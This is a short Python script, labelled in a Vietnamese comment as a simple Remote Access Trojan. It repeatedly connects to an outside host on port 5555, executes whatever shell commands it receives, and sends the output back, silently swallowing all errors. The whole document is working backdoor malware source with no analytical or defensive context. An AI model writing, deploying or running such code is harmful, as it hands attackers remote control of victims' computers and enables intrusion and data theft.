import socket, subprocess, os
# Remote Access Trojan don gian
host = "203.0.113.77"
port = 5555
while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        cmd = s.recv(4096).decode()
        out = subprocess.run(cmd, shell=True, capture_output=True).stdout
        s.send(out)
    except Exception:
        pass
